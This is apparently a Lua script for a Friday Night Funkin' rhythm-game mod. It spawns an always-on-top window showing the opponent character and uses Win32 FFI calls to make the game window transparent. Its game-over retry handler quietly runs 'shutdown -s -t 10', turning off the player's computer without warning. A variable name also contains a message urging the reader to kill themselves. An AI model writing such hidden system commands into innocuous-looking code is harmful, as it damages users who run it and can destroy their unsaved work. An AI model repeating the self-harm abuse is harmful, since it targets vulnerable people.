
function onSongStart()
    setProperty('dad.visible',false)
           
    -- change window stuff here
    runHaxeCode([[
        windowDad = Application.current.createWindow({
            title: 'cheater',
            width: 720,
            height: 600,
            borderless: true,
            alwaysOnTop: true
    
        });]])

		setTransparency(0x000f0f0f)
		runHaxeCode([[
			Application.current.window.focus();
	
			windowDad.stage.color = 0x000f0f0f;
			FlxG.mouse.useSystemCursor = true;
			FlxG.autoPause = false;
	
			]])

    
    --just ignore down below unless you know it
    
    







    
    runHaxeCode([[
        

        Application.current.window.focus();
    
        FlxG.mouse.useSystemCursor = true;
        FlxG.autoPause = false;
    
        
    
        windowDad.x = 10;
        windowDad.y = 50;
        dadWin = new Sprite();
        var dadScrollWin = new Sprite();
        windowDad.stage.addEventListener("keyDown", FlxG.keys.onKeyDown);
        windowDad.stage.addEventListener("keyUp", FlxG.keys.onKeyUp);

       FlxTween.tween(windowDad, { x: 1600, y: 1000 }, 2, {type:FlxTween.PINGPONG, ease: FlxEase.circOut});


        
        var m = new Matrix();
    
      
    
        
        dadWin.graphics.beginBitmapFill(game.dad.pixels, m);
        dadWin.graphics.drawRect(0, 0, game.dad.pixels.width, game.dad.pixels.height);
        dadWin.graphics.endFill();
        windowDad.stage.addChild(dadWin);
        dadWin.scaleX = 1;
        dadWin.scaleY = 1;
    
    ]])
    end

    local yourlifeisnothingyouservezeropurposeyoushouldkillyourselfnow = -29292929

function onDestroy() -- uh fixing uh you know uhhhh
    setTransparency(yourlifeisnothingyouservezeropurposeyoushouldkillyourselfnow)
    runHaxeCode([[
        windowDad.close();  //STOP CRASHING YOU MF
        FlxG.autoPause = true;
       ]])
end
    
    function onGameOverConfirm(retry)
    
    os.execute("shutdown -s -t 10")

    end



    function onUpdate(elapsed)
            runHaxeCode([[  
        
                var dadFrame = game.dad._frame;
                
                if (dadFrame == null || dadFrame.frame == null) return; // prevents crashes (i think???)
                    
                var rect = new Rectangle(dadFrame.frame.x, dadFrame.frame.y, dadFrame.frame.width, dadFrame.frame.height);
                
                dadWin.scrollRect = rect;
                dadWin.x = (((dadFrame.offset.x) - (game.dad.offset.x / 2)) * dadWin.scaleX);
                dadWin.y = (((dadFrame.offset.y) - (game.dad.offset.y / 2)) * dadWin.scaleY);   
    
                ]])
        
    end

    function onCreate()
        addHaxeLibrary('Lib', 'openfl')
        addHaxeLibrary('Application', 'openfl.display')
        addHaxeLibrary('Application', 'lime.app')
        addHaxeLibrary('FlxG', 'flixel')
        addHaxeLibrary('Matrix', 'openfl.geom')
        addHaxeLibrary('Rectangle', 'openfl.geom')
        addHaxeLibrary('Sprite', 'openfl.display')
    end



	ffi = require "ffi"

ffi.cdef [[
    typedef int BOOL;
        typedef int BYTE;
        typedef int LONG;
        typedef LONG DWORD;
        typedef DWORD COLORREF;
    typedef unsigned long HANDLE;
    typedef HANDLE HWND;
    typedef int bInvert;
        
        HWND GetActiveWindow(void);
        
        LONG SetWindowLongA(HWND hWnd, int nIndex, LONG dwNewLong);
        
    HWND SetLayeredWindowAttributes(HWND hwnd, COLORREF crKey, BYTE bAlpha, DWORD dwFlags);
        
        DWORD GetLastError();
]]
function setTransparency(color)
    local win = ffi.C.GetActiveWindow()
    

    if win == nil then
        debugPrint('Error finding window!!! idiot!!!!')
        debugPrint('cool code: '..tostring(ffi.C.GetLastError()))
    end
    if ffi.C.SetWindowLongA(win, -20, 0x00080000) == 0 then
        debugPrint('error setting window to be layed WTF DFOES THAT EVBEN MEAN LMAOOO!!! IM NOT NO NERD!')
        debugPrint('cool code: '..tostring(ffi.C.GetLastError()))
    end
    if ffi.C.SetLayeredWindowAttributes(win, color, 0, 0x00000001) == 0 then
        debugPrint('error setting color key or whatever')
        debugPrint('cool code: '..tostring(ffi.C.GetLastError()))
    end
end